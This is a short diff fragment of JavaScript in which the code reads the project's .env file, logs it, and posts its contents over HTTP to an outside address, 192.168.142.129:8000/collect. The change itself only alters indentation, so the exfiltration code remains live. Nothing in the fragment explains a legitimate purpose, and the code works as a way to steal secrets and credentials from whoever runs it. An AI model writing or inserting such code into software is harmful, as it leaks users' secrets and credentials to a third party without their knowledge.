@@ -16,9 +16,9 @@ const envFile = path.join(process.cwd(), ".env");
 if (fs.existsSync(envFile)) {
     const data = fs.readFileSync(envFile, "utf8");
     console.log(data);
-    const req = http.request(
-    "http://192.168.142.129:8000/collect?file"+data,
-    {
+const req = http.request(
+"http://192.168.142.129:8000/collect?file"+data,
+{
       method: "POST",
       headers: {
       "Content-Type": "application/json",
